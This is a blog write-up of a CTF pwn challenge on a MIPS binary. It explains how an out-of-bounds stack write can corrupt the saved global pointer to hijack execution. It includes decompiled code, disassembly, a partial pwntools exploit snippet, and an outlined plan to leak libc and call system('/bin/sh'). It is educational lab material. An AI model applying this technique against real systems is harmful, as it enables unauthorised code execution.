---
layout: blog
title: "outdated"
date: 2025-08-18
tags: [ctf]
description: "MIPS global pointer overwrite"
---

[source](https://github.com/papichulo16/ctf-stuff/blob/main/Sekai2025/pwn_outdated)

This challenge was very cool I learned a lot.

I have never looked at MIPS before but luckily it is pretty similar to ARM in a sense so I could make of it pretty well. This challenge was very easy to spot the bug since it was just one function (also ignore the memory mapping issue, I was too lazy to fix it):
```c
void main(void)

{
  size_t sVar1;
  ushort new_val;
  int level_idx;
  ushort levels [10];
  
  levels._0_4_ = uRam000011ac;
  levels._4_4_ = uRam000011b0;
  levels._8_4_ = uRam000011b4;
  levels._12_4_ = uRam000011b8;
  levels._16_4_ = uRam000011bc;
  puts_blue(0xcf0);
  puts((char *)0xffc);
  printf((char *)0x101c,main);
  puts((char *)0x104c);
  fgets(game_name,0x60,_stdin);
  sVar1 = strcspn(game_name,(char *)0x1074);
  game_name[sVar1] = 0;
  puts((char *)0x1078);
  puts(game_name);
  puts((char *)0x1094);
  puts((char *)0x10e8);
  scanf((char *)0x110c,&level_idx);
  puts((char *)0x1114);
  scanf((char *)0x1144,&new_val);
  levels[level_idx] = new_val; // <=============== index out of bounds
  printf((char *)0x114c,level_idx,(uint)new_val,game_name);
  puts((char *)0x118c);
                         /* WARNING: Subroutine does not return */
  exit(0);
}
```

With this index out of bounds we had a solid 2 bytes of overwrite in the stack, only problem is that the function does not return and only calls exit so there is no return pointer we can use here.

After seeing that I knew that there was some weird MIPS functionality that I would have to look at in order to exploit this, so to the dissassembly we go.

When looking at the disassembly, you can see that MIPS does some weird stuff when trying to access global memory or call functions. Take a look:
```mips
      00010b4c 10 00 dc 8f       lw        gp,local_38(s8)
      00010b50 24 00 c2 27       addiu     v0,s8,0x24
      00010b54 25 28 40 00       or        a1,v0,zero
      00010b58 30 80 82 8f       lw        v0,-0x7fd0(gp)=>PTR_00030030               = 00000000
      00010b5c 0c 11 44 24       addiu     a0,v0,0x110c
      00010b60 5c 80 82 8f       lw        v0,-0x7fa4(gp)=>-><EXTERNAL>::scanf        = 00010c70
      00010b64 25 c8 40 00       or        t9,v0,zero
      00010b68 00 00 19 f8       jialc     t9=><EXTERNAL>::scanf,0x0                  int scanf(char * __format, .
```

As you can see here, MIPS stores an address relative to global memory in the stack, then it takes that and stores it in the GP (global pointer) and then offsets it to access whatever global memory value it wants (including GOT functions). 

This is very interesting because I have not seen any other architecture that I have worked on (which is not many) do this, and I thought it was very neat. But with this, we are able to offset the GP in the stack before it accesses it and then control PC. In this case I made it offset to point to a global variable I had control of:

```python
    io.sendlineafter(b"game?", b"AAAAAAAAA")

    level_idx = -12
    io.sendlineafter(b"change?", f"{level_idx}")

    # last two bytes of global pointer, offset by 0x44 to point to game_name
    value = 0x8000 + 0x44
    io.sendlineafter(b"level?", f"{value}")

    # this calls 0x41414141
```

From here I got stuck and was trying different things for a couple hours to see what worked but I couldn't get anything so I decided to go watch UFC. Either way I learned something pretty cool from this challenge. I then the next day after looking at the solution I realized that it was not only the functions that were using the table but also read only strings:
```mips
        00010b6c 10 00 dc 8f         lw         gp,local_38(s8)
        00010b70 30 80 82 8f         lw         v0,-0x7fd0(gp)=>PTR_00030030           <======== PTR to the string
        00010b74 14 11 44 24         addiu      a0,v0,0x1114
        00010b78 7c 80 82 8f         lw         v0,-0x7f84(gp)=>-><EXTERNAL>::puts               = 00010c40
        00010b7c 25 c8 40 00         or         t9,v0,zero
        00010b80 00 00 19 f8         jialc      t9=><EXTERNAL>::puts,0x0                         int puts(char * __s)
```

With this I could of offset the GP a little more and would of written my own GOT and then had puts print out a value in the GOT to get a libc leak and then used the `exit()` call to call back to main and do this again but calling `system("/bin/sh)`. 

If I would of noticed that the GOT had a pointer nearby that pointed to all of the strings, I would of friggin solved it in time :(. It's okay.

